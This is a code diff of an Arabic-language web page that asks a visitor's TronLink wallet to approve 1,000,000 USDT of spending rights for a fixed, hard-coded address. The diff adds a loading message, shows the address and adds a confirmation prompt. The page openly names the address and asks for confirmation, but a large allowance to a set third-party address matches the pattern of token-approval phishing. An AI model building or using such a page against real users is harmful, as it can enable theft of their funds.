@@ -5,10 +5,17 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Approve USDT TRC20</title>
   <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; }
+    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+    #loading { color: green; font-weight: bold; display: none; }
+  </style>
 </head>
 <body>
-  <h2>تفويض USDT (1,000,000 USDT)</h2>
+  <h2>تفويض 1,000,000 USDT على شبكة ترون</h2>
+  <p>اضغط على الزر لمنح صلاحية لعنوان: <br><strong>TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu</strong></p>
   <button onclick="approveUSDT()">إعطاء صلاحية للتفويض</button>
+  <div id="loading">جاري المعالجة...</div>
 
   <script>
     const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
@@ -16,25 +23,31 @@
 
     async function approveUSDT() {
       try {
+        const loadingDiv = document.getElementById("loading");
+        loadingDiv.style.display = "block";
+
         // التحقق من وجود TronLink
         if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
           alert("يرجى تثبيت TronLink وتسجيل الدخول إلى محفظتك.");
+          loadingDiv.style.display = "none";
           return;
         }
 
-        // التحقق من الشبكة (Mainnet)
+        // التحقق من الشبكة
         if (window.tronWeb.fullNode.host !== "https://api.trongrid.io") {
-          alert("يرجى التأكد من أنك متصل بشبكة ترون الرئيسية (Mainnet).");
+          alert("يرجى الاتصال بشبكة ترون الرئيسية (Mainnet).");
+          loadingDiv.style.display = "none";
           return;
         }
 
         // التحقق من صحة عنوان Spender
         if (!window.tronWeb.isAddress(spenderAddress)) {
           alert("عنوان المفوض (Spender) غير صالح!");
+          loadingDiv.style.display = "none";
           return;
         }
 
-        // إعداد ABI الكامل لعقد USDT TRC-20
+        // إعداد ABI لعقد USDT
         const usdtABI = [
           {
             "constant": false,
@@ -44,41 +57,16 @@
             ],
             "name": "approve",
             "outputs": [{ "name": "", "type": "bool" }],
-            "type": "function"
-          },
-          {
-            "constant": true,
-            "inputs": [],
-            "name": "totalSupply",
-            "outputs": [{ "name": "", "type": "uint256" }],
-            "type": "function"
+            "type": "function",
+            "stateMutability": "nonpayable"
           },
           {
             "constant": true,
             "inputs": [{ "name": "_owner", "type": "address" }],
             "name": "balanceOf",
             "outputs": [{ "name": "", "type": "uint256" }],
-            "type": "function"
-          },
-          {
-            "constant": false,
-            "inputs": [
-              { "name": "_to", "type": "address" },
-              { "name": "_value", "type": "uint256" }
-            ],
-            "name": "transfer",
-            "outputs": [{ "name": "", "type": "bool" }],
-            "type": "function"
-          },
-          {
-            "constant": true,
-            "inputs": [
-              { "name": "_owner", "type": "address" },
-              { "name": "_spender", "type": "address" }
-            ],
-            "name": "allowance",
-            "outputs": [{ "name": "", "type": "uint256" }],
-            "type": "function"
+            "type": "function",
+            "stateMutability": "view"
           }
         ];
 
@@ -88,25 +76,34 @@
         // قيمة الـ Approve: 1,000,000 USDT (1,000,000 * 10^6)
         const amount = "1000000000000";
 
-        // التحقق من الرصيد قبل تنفيذ المعاملة
+        // التحقق من الرصيد
         const balance = await contract.balanceOf(window.tronWeb.defaultAddress.base58).call();
         if (balance < amount) {
-          alert("الرصيد غير كافٍ! رصيدك الحالي: " + (balance / 1000000) + " USDT");
+          alert(`الرصيد غير كافٍ! رصيدك الحالي: ${(balance / 1000000).toFixed(2)} USDT`);
+          loadingDiv.style.display = "none";
+          return;
+        }
+
+        // تأكيد من المستخدم قبل إرسال المعاملة
+        if (!confirm(`هل أنت متأكد من منح صلاحية ${amount / 1000000} USDT للعنوان: ${spenderAddress}؟`)) {
+          loadingDiv.style.display = "none";
           return;
         }
 
         // إرسال معاملة Approve
         const tx = await contract.approve(spenderAddress, amount).send({
-          feeLimit: 20000000, // 20 TRX، قيمة معقولة لمعاملة Approve
+          feeLimit: 15000000, // 15 TRX، مناسب لمعاملة Approve
           callValue: 0
         });
 
-        alert("تم إرسال معاملة التفويض بنجاح!\nمعرف المعاملة (TxID):\n" + tx);
+        alert(`تم إرسال معاملة التفويض بنجاح!\nمعرف المعاملة (TxID):\n${tx}`);
         console.log("Transaction ID:", tx);
+        loadingDiv.style.display = "none";
 
       } catch (error) {
         console.error("خطأ أثناء المعاملة:", error);
-        alert("فشل تنفيذ عملية التفويض:\n" + (error.message || error));
+        alert(`فشل تنفيذ عملية التفويض:\n${error.message || error}`);
+        document.getElementById("loading").style.display = "none";
       }
     }
   </script>
